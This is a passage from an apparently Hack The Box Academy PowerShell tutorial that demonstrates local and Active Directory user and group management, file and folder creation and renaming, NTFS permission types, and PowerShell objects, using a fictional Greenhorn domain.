The default account is used by the system for running multi-user auth apps like the Xbox utility.

`Guest Account`

This account is a limited rights account that allows users without a normal user account to access the host. It is disabled by default and should stay that way.

`WDAGUtility Account`

This account is in place for the Defender Application Guard, which can sandbox application sessions.

* * *

Brief Intro to Active Directory
-------------------------------

In a nutshell, `Active Directory` (AD) is a directory service for Windows environments that provides a central point of management for `users`, computers, `groups`, network devices, `file shares`, group policies, `devices`, and trusts with other organizations. Think of it as the gatekeeper for an enterprise environment. Anyone who is a part of the domain can access resources freely, while anyone who is not is denied access to those same resources or, at a minimum, stuck waiting in the visitors center.

Within this section, we care about AD in the context of users and groups. We can administer them from PowerShell on `any domain joined host` utilizing the `ActiveDirectory` Module. Taking a deep dive into Active Directory would take more than one section, so we will not try here. To learn more about AD, you should check out the [Introduction to Active Directory module](https://academy.hackthebox.com/module/details/74).

### Local vs. Domain Joined Users

`How are they different?`

`Domain` users differ from `local` users in that they are granted rights from the domain to access resources such as file servers, printers, intranet hosts, and other objects based on user and group membership. Domain user accounts can log in to any host in the domain, while the local user only has permission to access the specific host they were created on.

It is worth looking through the documentation on [accounts](https://learn.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts) to understand better how the various accounts work together on an individual Windows system and across a domain network. Take some time to look them over and understand the nuances between them. Understanding their uses and the utility of each type of account can make or break a pentesters attempt at privileged access or lateral movement during a penetration test.

### What Are User Groups?

Groups are a way to sort user accounts logically and, in doing so, provide granular permissions and access to resources without having to manage each user manually. For example, we could restrict access to a specific directory or share so that only users who need access can view the files. On a singular host, this does not mean much to us. However, logical grouping is essential to maintain a proper security posture within a domain of hundreds, if not thousands, of users. From a domain perspective, we have several different types of groups that can hold not only users but end devices like PCs, printers, and even other groups. This concept is too deep of a dive for this module. However, we will talk about how to manage groups for now. If you wish to know more and get a deep dive into Active Directory and how it utilizes groups to maintain security, check out this [module](https://academy.hackthebox.com/module/details/74).

#### Get-LocalGroup

User and Group Management

    PS C:\htb> get-localgroup
    
    Name                                Description
    ----                                -----------
    __vmware__                          VMware User Group
    Access Control Assistance Operators Members of this group can remotely query authorization attributes and permission...
    Administrators                      Administrators have complete and unrestricted access to the computer/domain
    Backup Operators                    Backup Operators can override security restrictions for the sole purpose of back...
    Cryptographic Operators             Members are authorized to perform cryptographic operations.
    Device Owners                       Members of this group can change system-wide settings.
    Distributed COM Users               Members are allowed to launch, activate and use Distributed COM objects on this ...
    Event Log Readers                   Members of this group can read event logs from local machine
    Guests                              Guests have the same access as members of the Users group by default, except for...
    Hyper-V Administrators              Members of this group have complete and unrestricted access to all features of H...
    IIS_IUSRS                           Built-in group used by Internet Information Services.
    Network Configuration Operators     Members in this group can have some administrative privileges to manage configur...
    Performance Log Users               Members of this group may schedule logging of performance counters, enable trace...
    Performance Monitor Users           Members of this group can access performance counter data locally and remotely
    Power Users                         Power Users are included for backwards compatibility and possess limited adminis...
    Remote Desktop Users                Members in this group are granted the right to logon remotely
    Remote Management Users             Members of this group can access WMI resources over management protocols (such a...
    Replicator                          Supports file replication in a domain
    System Managed Accounts Group       Members of this group are managed by the system.
    Users                               Users are prevented from making accidental or intentional system-wide changes an...  
    
    

Above is an example of the local groups to a standalone host. We can see there are groups for simple things like Administrators and guest accounts, but also groups for specific roles like administrators for virtualization applications, remote users, etc. Let us interact with users and groups now that we understand them.

Adding/Removing/Editing User Accounts & Groups
----------------------------------------------

Like most other things in PowerShell, we use the `get`, `new`, and `set` verbs to find, create and modify users and groups. If dealing with local users and groups, `localuser & localgroup` can accomplish this. For domain assets, `aduser & adgroup` does the trick. If we were not sure, we could always use the `Get-Command *user*` cmdlet to see what we have access to. Let us give a few of them a try.

#### Identifying Local Users

User and Group Management

    PS C:\htb> Get-LocalUser  
      
    Name               Enabled Description
    ----               ------- -----------
    Administrator      False   Built-in account for administering the computer/domain
    DefaultAccount     False   A user account managed by the system.
    DLarusso           True    High kick specialist.
    Guest              False   Built-in account for guest access to the computer/domain
    sshd               True
    WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender A...
    

`Get-LocalUser` will display the users on our host. These users only have access to this particular host. Let us say that we want to create a new local user named `JLawrence`. We can accomplish the task using `New-LocalUser`. If we are unsure of the proper syntax, please do not forget about the `Get-Help` Command. When creating a new local user, the only real requirement from a syntax perspective is to enter a `name` and specify a `password` (or `-NoPassword`). All other settings, such as a description or account expiration, are optional.

#### Creating A New User

User and Group Management

    PS C:\htb>  New-LocalUser -Name "JLawrence" -NoPassword
    
    Name      Enabled Description
    ----      ------- -----------
    JLawrence True
    

Above, we created the user `JLawrence` and did not set a password. So this account is active and can be logged in without a password. Depending on the version of Windows we are using, by not setting a Password, we are flagging to windows that this is a Microsoft live account, and it attempts to login in that manner instead of using a local password.

If we wish to modify a user, we could use the `Set-LocalUser` cmdlet. For this example, we will modify `JLawrence` and set a password and description on his account.

#### Modifying a User

User and Group Management

    PS C:\htb> $Password = Read-Host -AsSecureString
    ****************
    PS C:\htb> Set-LocalUser -Name "JLawrence" -Password $Password -Description "CEO EagleFang"
    PS C:\htb> Get-LocalUser  
    
    Name               Enabled Description
    ----               ------- -----------
    Administrator      False   Built-in account for administering the computer/domain
    DefaultAccount     False   A user account managed by the system.
    demo               True
    Guest              False   Built-in account for guest access to the computer/domain
    JLawrence          True    CEO EagleFang
    

As for making and modifying users, it is as simple as what we see above. Now, let us move on to checking out groups. If it feels like a bit of an echo...well, it is. The commands are similar in use.

#### Get-LocalGroup

User and Group Management

    PS C:\htb> Get-LocalGroup  
    
    Name                                Description
    ----                                -----------
    Access Control Assistance Operators Members of this group can remotely query authorization attr...
    Administrators                      Administrators have complete and unrestricted access to the...
    Backup Operators                    Backup Operators can override security restrictions for the...
    Cryptographic Operators             Members are authorized to perform cryptographic operations.
    Device Owners                       Members of this group can change system-wide settings.
    Distributed COM Users               Members are allowed to launch, activate and use Distributed...
    Event Log Readers                   Members of this group can read event logs from local machine
    Guests                              Guests have the same access as members of the Users group b...
    Hyper-V Administrators              Members of this group have complete and unrestricted access...
    IIS_IUSRS                           Built-in group used by Internet Information Services.
    Network Configuration Operators     Members in this group can have some administrative privileg...
    Performance Log Users               Members of this group may schedule logging of performance c...
    Performance Monitor Users           Members of this group can access performance counter data l...
    Power Users                         Power Users are included for backwards compatibility and po...
    Remote Desktop Users                Members in this group are granted the right to logon remotely
    Remote Management Users             Members of this group can access WMI resources over managem...
    Replicator                          Supports file replication in a domain
    System Managed Accounts Group       Members of this group are managed by the system.
    Users                               Users are prevented from making accidental or intentional s...
    
    PS C:\Windows\system32> Get-LocalGroupMember -Name "Users"
    
    ObjectClass Name                             PrincipalSource
    ----------- ----                             ---------------
    User        DESKTOP-B3MFM77\demo             Local
    User        DESKTOP-B3MFM77\JLawrence        Local
    Group       NT AUTHORITY\Authenticated Users Unknown
    Group       NT AUTHORITY\INTERACTIVE         Unknown
    

In the output above, we ran the `Get-LocalGroup` cmdlet to get a printout of each group on the host. In the second command, we decided to inspect the `Users` group and see who is a member of said group. We did this with the `Get-LocalGroupMember` command. Now, if we wish to add another group or user to a group, we can use the `Add-LocalGroupMember` command. We will add `JLawrence` to the `Remote Desktop Users` group in the example below.

#### Adding a Member To a Group

User and Group Management

    PS C:\htb> Add-LocalGroupMember -Group "Remote Desktop Users" -Member "JLawrence"
    PS C:\htb> Get-LocalGroupMember -Name "Remote Desktop Users" 
    
    ObjectClass Name                      PrincipalSource
    ----------- ----                      ---------------
    User        DESKTOP-B3MFM77\JLawrence Local
    

After running the command, we checked the group membership and saw that our user was indeed added to the Remote Desktop Users group. Maintaining local users and groups is simple and does not require external modules. Managing Active Directory Users and Groups requires a bit more work.

### Managing Domain Users and Groups

Before we can access the cmdlets we need and work with Active Directory, we must install the `ActiveDirectory` PowerShell Module. If you installed the AdminToolbox, the AD module might already be on your host. If not, we can quickly grab the AD modules and get to work. One requirement is to have the optional feature `Remote System Administration Tools` installed. This feature is the only way to get the official ActiveDirectory PowerShell module. The edition in AdminToolbox and other Modules is repackaged, so use caution.

#### Installing RSAT

User and Group Management

    PS C:\htb> Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online
    
    Path          :  
    Online        : True  
    RestartNeeded : False  
    
    

The above command will install `ALL` RSAT features in the Microsoft Catalog. If we wish to stay lightweight, we can install the package named `Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0`. Now we should have the ActiveDirectory module installed. Let us check.

#### Locating The AD Module

User and Group Management

    PS C:\htb> Get-Module -Name ActiveDirectory -ListAvailable 
    
        Directory: C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    
    
    ModuleType Version    Name                                ExportedCommands
    ---------- -------    ----                                ----------------
    Manifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAccount, Add-ADDomainControllerPasswordReplicationPolicy, Add-A...
    

Nice. Now that we have the module, we can get started with AD `User` and `Group` management. The easiest way to locate a specific user is by searching with the `Get-ADUser` cmdlet.

#### Get-ADUser

User and Group Management

    PS C:\htb> Get-ADUser -Filter *
    
    DistinguishedName : CN=user14,CN=Users,DC=greenhorn,DC=corp
    Enabled           : True
    GivenName         :
    Name              : user14
    ObjectClass       : user
    ObjectGUID        : bef9787d-2716-4dc9-8e8f-f8037a72c3d9
    SamAccountName    : user14
    SID               : S-1-5-21-1480833693-1324064541-2711030367-1110
    Surname           :
    UserPrincipalName :
    
    DistinguishedName : CN=sshd,CN=Users,DC=greenhorn,DC=corp
    Enabled           : True
    GivenName         :
    Name              : sshd
    ObjectClass       : user
    ObjectGUID        : 7a324e98-00e4-480b-8a1a-fa465d558063
    SamAccountName    : sshd
    SID               : S-1-5-21-1480833693-1324064541-2711030367-1112
    Surname           :
    UserPrincipalName :
    
    DistinguishedName : CN=TSilver,CN=Users,DC=greenhorn,DC=corp
    Enabled           : True
    GivenName         :
    Name              : TSilver
    ObjectClass       : user
    ObjectGUID        : a19a6c8a-000a-4cbf-aa14-0c7fca643c37
    SamAccountName    : TSilver
    SID               : S-1-5-21-1480833693-1324064541-2711030367-1602
    Surname           :
    UserPrincipalName :  
    
    <SNIP>
    

The parameter `-Filter *` lets us grab all users within Active Directory. Depending on our organization's size, this could produce a ton of output. We can use the `-Identity` parameter to perform a more specific search for a user by `distinguished name, GUID, the objectSid, or SamAccountName`. Do not worry if these options seem like gibberish to you; that is all right. The specifics of these are not important right now; for more reading on the topic, check out [this article](https://learn.microsoft.com/en-us/windows/win32/ad/naming-properties) or the [Intro To Active Directory](https://academy.hackthebox.com/course/preview/introduction-to-active-directory) module. We are going to search for the user `TSilver` now.

#### Get a Specific User

User and Group Management

    PS C:\htb>  Get-ADUser -Identity TSilver
    
    
    DistinguishedName : CN=TSilver,CN=Users,DC=greenhorn,DC=corp
    Enabled           : True
    GivenName         :
    Name              : TSilver
    ObjectClass       : user
    ObjectGUID        : a19a6c8a-000a-4cbf-aa14-0c7fca643c37
    SamAccountName    : TSilver
    SID               : S-1-5-21-1480833693-1324064541-2711030367-1602
    Surname           :
    UserPrincipalName :
      
    

We can see from the output several pieces of information about the user, including:

*   `Object Class`: which specifies if the object is a user, computer, or another type of object.
*   `DistinguishedName`: Specifies the object's relative path within the AD schema.
*   `Enabled`: Tells us if the user is active and can log in.
*   `SamAccountName`: The representation of the username used to log into the ActiveDirectory hosts.
*   `ObjectGUID`: Is the unique identifier of the user object.

Users have many different attributes ( not all shown here ) and can all be used to identify and group them. We could also use these to filter specific attributes. For example, let us filter the user's `Email address`.

#### Searching On An Attribute

User and Group Management

    PS C:\htb> Get-ADUser -Filter {EmailAddress -like '*greenhorn.corp'}
    
    
    DistinguishedName : CN=TSilver,CN=Users,DC=greenhorn,DC=corp
    Enabled           : True
    GivenName         :
    Name              : TSilver
    ObjectClass       : user
    ObjectGUID        : a19a6c8a-000a-4cbf-aa14-0c7fca643c37
    SamAccountName    : TSilver
    SID               : S-1-5-21-1480833693-1324064541-2711030367-1602
    Surname           :
    UserPrincipalName :
    

In our output, we can see that we only had one result for a user with an email address matching our naming context `*greenhorn.corp`. This is just one example of attributes we can filter on. For a more detailed list, check out this [Technet Article](https://social.technet.microsoft.com/wiki/contents/articles/12037.active-directory-get-aduser-default-and-extended-properties.aspx), which covers the default and extended user object properties.

We need to create a new user for an employee named `Mori Tanaka` who just joined Greenhorn. Let us give the New-ADUser cmdlet a try.

#### New ADUser

User and Group Management

    PS C:\htb> New-ADUser -Name "MTanaka" -Surname "Tanaka" -GivenName "Mori" -Office "Security" -OtherAttributes @{'title'="Sensei";'mail'="MTanaka@greenhorn.corp"} -Accountpassword (Read-Host -AsSecureString "AccountPassword") -Enabled $true 
    
    AccountPassword: ****************
    PS C:\htb> Get-ADUser -Identity MTanaka -Properties * | Format-Table Name,Enabled,GivenName,Surname,Title,Office,Mail
    
    Name    Enabled GivenName Surname Title  Office   Mail
    ----    ------- --------- ------- -----  ------   ----
    MTanaka    True Mori      Tanaka  Sensei Security MTanaka@greenhorn.corp
    

Ok, a lot is going on here. It may look daunting but let us dissect it. The `first` portion of the output above is creating our user:

*   `New-ADUser -Name "MTanaka"` : We issue the `New-ADUser` command and set the user's SamAccountName to `MTanaka`.
*   `-Surname "Tanaka" -GivenName "Mori"`: This portion sets our user's `Lastname` and `Firstname`.
*   `-Office "Security"`: Sets the extended property of `Office` to `Security`.
*   `-OtherAttributes @{'title'="Sensei";'mail'="MTanaka@greenhorn.corp"}`: Here we set other extended attributes such as `title` and `Email-Address`.
*   `-Accountpassword (Read-Host -AsSecureString "AccountPassword")`: With this portion, we set the user's `password` by having the shell prompt us to enter a new password. (we can see it in the line below with the stars)
*   `-Enabled $true`: We are enabling the account for use. The user could not log in if this was set to `\$False`.

The `second` is validating that the user we created and the properties we set exist:

*   `Get-ADUser -Identity MTanaka -Properties *`: Here, we are searching for the user's properties `MTanaka`.
*   `|` : This is the Pipe symbol. It will be explored more in another section, but for now, it takes our `output` from `Get-ADUser` and sends it into the following command.
*   `Format-Table Name,Enabled,GivenName,Surname,Title,Office,Mail`: Here, we tell PowerShell to `Format` our results as a `table` including the default and extended properties listed.

Seeing the commands broken down like this helps demystify the strings. Now, what if we need to modify a user? `Set-ADUser` is our ticket. Many of the filters we looked at earlier apply here as well. We can change or set any of the attributes that were listed. For this example, let us add a `Description` to Mr. Tanaka.

#### Changing a Users Attributes

User and Group Management

    PS C:\htb> Set-ADUser -Identity MTanaka -Description " Sensei to Security Analyst's Rocky, Colt, and Tum-Tum"  
    
    PS C:\htb> Get-ADUser -Identity MTanaka -Property Description
    
    
    Description       :  Sensei to Security Analyst's Rocky, Colt, and Tum-Tum
    DistinguishedName : CN=MTanaka,CN=Users,DC=greenhorn,DC=corp
    Enabled           : True
    GivenName         : Mori
    Name              : MTanaka
    ObjectClass       : user
    ObjectGUID        : c19e402d-b002-4ca0-b5ac-59d416166b3a
    SamAccountName    : MTanaka
    SID               : S-1-5-21-1480833693-1324064541-2711030367-1603
    Surname           : Tanaka
    UserPrincipalName :
    

Querying AD, we can see that the `description` we set has been added to the attributes of Mr. Tanaka. User and group management is a common task we may find ourselves doing as sysadmins. However, why should we care about it as a `pentester`?

Why is Enumerating Users & Groups Important?
--------------------------------------------

Users and groups provide a wealth of opportunities regarding Pentesting a Windows environment. We will often see users misconfigured. They may be given excessive permissions, added to unnecessary groups, or have weak/no passwords set. Groups can be equally as valuable. Often groups will have nested membership, allowing users to gain privileges they may not need. These misconfigurations can be easily found and visualized with Tools like [Bloodhound](https://github.com/BloodHoundAD/BloodHound). For a detailed look at enumerating Users and Groups, check out the [Windows Privilege Escalation](https://academy.hackthebox.com/course/preview/windows-privilege-escalation) module.



Working with Files and Directories - PowerShell
===============================================

* * *

We already know how to navigate around the host and manage users and groups utilizing only PowerShell; now, it is time to explore files and directories. In this section, we will experiment with creating, modifying, and deleting files and directories, along with a quick introduction to file permissions and how to enumerate them. By now, we should be familiar with the `Get, Set, New` verbs, among others, so we will speed this up with our examples by combining several commands into a single shell session.

* * *

Creating/Moving/Deleting Files & Directories
--------------------------------------------

Many of the cmdlets we will discuss in this section can apply to working with files and folders, so we will combine some of our actions to work more efficiently (as any good pentester or sysadmin should strive to.). The table below lists the commonly used cmdlets used when dealing with objects in PowerShell.

#### Common Commands Used for File & Folder Management

**Command**

**Alias**

**Description**

`Get-Item`

gi

Retrieve an object (could be a file, folder, registry object, etc.)

`Get-ChildItem`

ls / dir / gci

Lists out the content of a folder or registry hive.

`New-Item`

md / mkdir / ni

Create new objects. ( can be files, folders, symlinks, registry entries, and more)

`Set-Item`

si

Modify the property values of an object.

`Copy-Item`

copy / cp / ci

Make a duplicate of the item.

`Rename-Item`

ren / rni

Changes the object name.

`Remove-Item`

rm / del / rmdir

Deletes the object.

`Get-Content`

cat / type

Displays the content within a file or object.

`Add-Content`

ac

Append content to a file.

`Set-Content`

sc

overwrite any content in a file with new data.

`Clear-Content`

clc

Clear the content of the files without deleting the file itself.

`Compare-Object`

diff / compare

Compare two or more objects against each other. This includes the object itself and the content within.

**Scenario: Greenhorn's new Security Chief, Mr. Tanaka, has requested that a set of files and folders be created for him. He plans to use them for SOP documentation for the Security team. Since he just got host access, we have agreed to set the file & folder structure up for him. If you would like to follow along with the examples below, please feel free. For your practice, we removed the folders and files discussed below so you can take a turn recreating them.**

First, we are going to start with the folder structure he requested. We are going to make three folders named :

*   `SOPs`
    *   `Physical Sec`
    *   `Cyber Sec`
    *   `Training`

We will use the `Get-Item`, `Get-ChildItem`, and `New-Item` commands to create our folder structure. Let us get started. We first need to determine `where we are` in the host and then move to Mr. Tanaka's `Documents` folder.

#### Finding Our Place

Working with Files and Directories - PowerShell

    PS C:\htb> Get-Location
    
    Path
    ----
    C:\Users\MTanaka
    
    PS C:\Users\MTanaka> cd Documents
    PS C:\Users\MTanaka\Documents>
    

Now that we are in the correct directory, it's time to get to work. Next, we need to make the SOPs folder. The New-Item Cmdlet can be used to accomplish this.

#### New-Item

Working with Files and Directories - PowerShell

    PS C:\Users\MTanaka\Documents>  new-item -name "SOPs" -type directory
    
    
        Directory: C:\Users\MTanaka\Documents
    
    
    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    d-----         10/5/2022  12:20 PM                SOPs
    
    

Awesome. Our main directory exists now. Let us create our nested folders `Physical Sec, Cyber Sec, and Training`. We can utilize the same command from last time or the alias `mkdir`. First, we need to move into the `SOPs` Directory.

#### Making More Directories

Working with Files and Directories - PowerShell

    PS C:\Users\MTanaka\Documents> cd SOPs 
    
    PS C:\Users\MTanaka\Documents\SOPs> mkdir "Physical Sec"
    
        Directory: C:\Users\MTanaka\Documents\SOPs
    
    
    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    d-----         10/5/2022   4:30 PM                Physical Sec
    
    PS C:\Users\MTanaka\Documents\SOPs> mkdir "Cyber Sec"
    
        Directory: C:\Users\MTanaka\Documents\SOPs
    
    
    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    d-----         10/5/2022   4:30 PM                Cyber Sec
    
    PS C:\Users\MTanaka\Documents\SOPs> mkdir "Training"
    
        Directory: C:\Users\MTanaka\Documents\SOPs
    
    
    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    d-----         10/5/2022   4:31 PM                Training  
    
    PS C:\Users\MTanaka\Documents\SOPs> Get-ChildItem 
    
    Directory: C:\Users\MTanaka\Documents\SOPs
    
    
    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    d-----        10/5/2022   9:08 AM                Cyber Sec
    d-----        11/5/2022   9:09 AM                Physical Sec
    d-----        11/5/2022   9:08 AM                Training
    
    

Now that we have our directory structure in place. It's time to start populating the files required. Mr. Tanaka asked for a Markdown file in each folder like so:

*   `SOPs` > ReadMe.md
    *   `Physical Sec` > Physical-Sec-draft.md
    *   `Cyber Sec` > Cyber-Sec-draft.md
    *   `Training` > Employee-Training-draft.md

In each file, he has requested this header at the top:

*   Title: Insert Document Title Here
*   Date: x/x/202x
*   Author: MTanaka
*   Version: 0.1 (Draft)

We should be able to quickly knock this out using the `New-Item` cmdlet and the `Add-Content` cmdlet.

#### Making Files

Working with Files and Directories - PowerShell

    PS C:\htb> PS C:\Users\MTanaka\Documents\SOPs> new-Item "Readme.md" -ItemType File
    
        Directory: C:\Users\MTanaka\Documents\SOPs
    
    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    -a----        11/10/2022   9:12 AM              0 Readme.md
    
    PS C:\Users\MTanaka\Documents\SOPs> cd '.\Physical Sec\'
    PS C:\Users\MTanaka\Documents\SOPs\Physical Sec> ls
    PS C:\Users\MTanaka\Documents\SOPs\Physical Sec> new-Item "Physical-Sec-draft.md" -ItemType File
    
        Directory: C:\Users\MTanaka\Documents\SOPs\Physical Sec
    
    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    -a----        11/10/2022   9:14 AM              0 Physical-Sec-draft.md
    
    PS C:\Users\MTanaka\Documents\SOPs\Physical Sec> cd ..
    PS C:\Users\MTanaka\Documents\SOPs> cd '.\Cyber Sec\'
    
    PS C:\Users\MTanaka\Documents\SOPs\Cyber Sec> new-Item "Cyber-Sec-draft.md" -ItemType File
    
        Directory: C:\Users\MTanaka\Documents\SOPs\Cyber Sec
    
    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    -a----        11/10/2022   9:14 AM              0 Cyber-Sec-draft.md
    
    PS C:\Users\MTanaka\Documents\SOPs\Cyber Sec> cd ..
    PS C:\Users\MTanaka\Documents\SOPs> cd .\Training\
    PS C:\Users\MTanaka\Documents\SOPs\Training> ls
    PS C:\Users\MTanaka\Documents\SOPs\Training> new-Item "Employee-Training-draft.md" -ItemType File
    
        Directory: C:\Users\MTanaka\Documents\SOPs\Training
    
    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    -a----        11/10/2022   9:15 AM              0 Employee-Training-draft.md
    
    PS C:\Users\MTanaka\Documents\SOPs\Training> cd ..
    PS C:\Users\MTanaka\Documents\SOPs> tree /F
    Folder PATH listing
    Volume serial number is F684-763E
    C:.
    │   Readme.md
    │
    ├───Cyber Sec
    │       Cyber-Sec-draft.md
    │
    ├───Physical Sec
    │       Physical-Sec-draft.md
    │
    └───Training
            Employee-Training-draft.md
    

Now that we have our files, we need to add content inside them. We can do so with the `Add-Content` cmdlet.

#### Adding Content

Working with Files and Directories - PowerShell

    PS C:\htb> Add-Content .\Readme.md "Title: Insert Document Title Here
    >> Date: x/x/202x
    >> Author: MTanaka
    >> Version: 0.1 (Draft)"  
      
    PS C:\Users\MTanaka\Documents\SOPs> cat .\Readme.md
    Title: Insert Document Title Here
    Date: x/x/202x
    Author: MTanaka
    Version: 0.1 (Draft)
    

We would then perform this same process we did for `Readme.md` in every other file we created for Mr. Tanaka. This scenario felt a bit tedious, right? Creating files over and over by hand can get tiresome. This is where automation and scripting come into place. It is a bit out of reach right now, but in a later section in this module, we will discuss how to make a quick PowerShell Module, using variables and writing scripts to make things easier.

**Scenario Cont.: Mr. Tanaka has asked us to change the name of the file \`Cyber-Sec-draft.md\` to \`Infosec-SOP-draft.md\`.**

We can quickly knock this task out using the `Rename-Item` cmdlet. Lets' give it a try:

#### Renaming An Object

Working with Files and Directories - PowerShell

    PS C:\Users\MTanaka\Documents\SOPs\Cyber Sec> ls
    
        Directory: C:\Users\MTanaka\Documents\SOPs\Cyber Sec
    
    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    -a----        11/10/2022   9:14 AM              0 Cyber-Sec-draft.md
    
    PS C:\Users\MTanaka\Documents\SOPs\Cyber Sec> Rename-Item .\Cyber-Sec-draft.md -NewName Infosec-SOP-draft.md
    PS C:\Users\MTanaka\Documents\SOPs\Cyber Sec> ls
    
        Directory: C:\Users\MTanaka\Documents\SOPs\Cyber Sec
    
    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    -a----        11/10/2022   9:14 AM              0 Infosec-SOP-draft.md
    

All we needed to do above was issue the `Rename-Item` cmdlet, give it the original filename we want to change (`Cyber-Sec-draft.md`), and then tell it our new name with the `-NewName` (`Infosec-SOP-draft.md`) parameter. Seems simple right? We could take this further and rename all files within a directory or change the file type or several different actions. In our example below, we will change the names of all text files in Mr. Tanakas Desktop from `file.txt` to `file.md`.

#### Files1-5.txt are on MTanaka's Desktop

Working with Files and Directories - PowerShell

    PS C:\Users\MTanaka\Desktop> ls
    
        Directory: C:\Users\MTanaka\Desktop
    
    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    -a----        10/13/2022   1:05 PM              0 file-1.txt
    -a----        10/13/2022   1:05 PM              0 file-2.txt
    -a----        10/13/2022   1:06 PM              0 file-3.txt
    -a----        10/13/2022   1:06 PM              0 file-4.txt
    -a----        10/13/2022   1:06 PM              0 file-5.txt
    
    PS C:\Users\MTanaka\Desktop> get-childitem -Path *.txt | rename-item -NewName {$_.name -replace ".txt",".md"}
    PS C:\Users\MTanaka\Desktop> ls
    
        Directory: C:\Users\MTanaka\Desktop
    
    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    -a----        10/13/2022   1:05 PM              0 file-1.md
    -a----        10/13/2022   1:05 PM              0 file-2.md
    -a----        10/13/2022   1:06 PM              0 file-3.md
    -a----        10/13/2022   1:06 PM              0 file-4.md
    -a----        10/13/2022   1:06 PM              0 file-5.md
    

As we can see above, we had five text files on the Desktop. We changed them to `.md` files using `get-childitem -Path *.txt` to select the objects and used `|` to send those objects to the `rename-item -NewName {$_.name -replace ".txt",".md"}` cmdlet which renames everything from its original name ($\_.name) and replaces the `.txt` from name to `.md`. This is a much faster way to interact with files and perform bulk actions. Now that we have completed all of Mr. Tanakas' requests, let us discuss File and Directory permissions for a second.

* * *

What are File & Directory Permissions
-------------------------------------

Permissions, simplified, are our host's way of determining who has access to a specific object and what they can do with it. These permissions allow us to apply granular security control over our objects to maintain a proper security posture. In environments like large organizations with multiple departments (like HR, IT, Sales, etc.), want to ensure they keep information access on a "need to know" basis. This ensures that an outsider cannot corrupt or misuse the data. The Windows file system has many basic and advanced permissions. Some of the key permission types are:

#### Permission Types Explained

*   `Full Control`: Full Control allows for the user or group specified the ability to interact with the file as they see fit. This includes everything below, changing the permissions, and taking ownership of the file.
*   `Modify`: Allows reading, writing, and deleting files and folders.
*   `List Folder Contents`: This makes viewing and listing folders and subfolders possible along with executing files. This only applies to `folders`.
*   `Read and Execute`: Allows users to view the contents within files and run executables (.ps1, .exe, .bat, etc.)
*   `Write`: Write allows a user the ability to create new files and subfolders along with being able to add content to files.
*   `Read`: Allows for viewing and listing folders and subfolders and viewing a file's contents.
*   `Traverse Folder`: Traverse allows us to give a user the ability to access files or subfolders within a tree but not have access to the higher-level folder's contents. This is a way to provide selective access from a security perspective.

Windows ( NTFS, in general ) allows us to set permissions on a parent directory and have those permissions populate each file and folder located within that directory. This saves us a ton of time compared to manually setting the permissions on each object contained within. This inheritance can be disabled as necessary for specific files, folders, and sub-folders. If done, we will have to set the permissions we want on the affected files manually. Working with permissions can be a complex task and a bit much to do just from the CLI, so we will leave playing with permissions to the `Windows Fundamentals Module`.

* * *

Finding & Filtering Content
===========================

* * *

Being able to search for, find, and filter content for what we are looking for is an absolute requirement for any user who utilizes the CLI ( regardless of what shell or OS ). Nevertheless, how do we do this in PowerShell? To answer this question, this section will dive into specifics of how PowerShell utilizes `Objects`, how we can `filter` based on `Properties` and `content`, and describe components like the PowerShell `Pipeline` further.

* * *

Explanation of PowerShell Output (Objects Explained)
----------------------------------------------------

With PowerShell, not everything is generic text strings like in Bash or cmd. In PowerShell, everything is an `Object`. However, what is an object? Let us examine this concept further:

`What is an Object?` An `object` is an `individual` instance of a `class` within PowerShell. Let us use the example of a computer as our object. The total of everything (parts, time, design, software, etc.) makes a computer a computer.

`What is a Class?` A class is the `schema` or 'unique representation of a thing (object) and how the sum of its `properties` define it. The `blueprint` used to lay out how that computer should be assembled and what everything within it can be considered a Class.

`What are Properties?` Properties are simply the `data` associated with an object in PowerShell. For our example of a computer, the individual `parts` that we assemble to make the computer are its properties. Each part serves a purpose and has a unique use within the object.

`What are Methods?` Simply put, methods are all the functions our object has. Our computer allows us to process data, surf the internet, learn new skills, etc. All of these are the methods for our object.

Now, we defined these terms so that we understand all the different properties we will be looking at later and what methods of interaction we have with objects. By understanding how PowerShell interprets objects and utilizes Classes, we can define our own object types. Moving on, we will look at how we can filter and find objects through the PowerShell CLI.

### Finding and Filtering Objects

Let us look at this through a `user object` context. A user can do things like access files, run applications, and input/output data. But what is a user? What is it made up of?

#### Get an Object (User) and its Properties/Methods

Finding & Filtering Content

    PS C:\htb> Get-LocalUser administrator | get-member
    
       TypeName: Microsoft.PowerShell.Commands.LocalUser
    
    Name                   MemberType Definition
    ----                   ---------- ----------
    Clone                  Method     Microsoft.PowerShell.Commands.LocalUser Clone()
    Equals                 Method     bool Equals(System.Object obj)
    GetHashCode            Method     int GetHashCode()
    GetType                Method     type GetType()
    ToString               Method     string ToString()
    AccountExpires         Property   System.Nullable[datetime] AccountExpires {get;set;}
    Description            Property   string Description {get;set;}
    Enabled                Property   bool Enabled {get;set;}
    FullName               Property   string FullName {get;set;}
    LastLogon              Property   System.Nullable[datetime] LastLogon {get;set;}
    Name                   Property   string Name {get;set;}
    ObjectClass            Property   string ObjectClass {get;set;}
    PasswordChangeableDate Property   System.Nullable[datetime] PasswordChangeableDate {get;set;}
    PasswordExpires        Property   System.Nullable[datetime] PasswordExpires {get;set;}
    PasswordLastSet        Property   System.Nullable[datetime] PasswordLastSet {get;set;}
    PasswordRequired       Property   bool PasswordRequired {get;set;}
    PrincipalSource        Property   System.Nullable[Microsoft.PowerShell.Commands.PrincipalSource] PrincipalSource {ge...
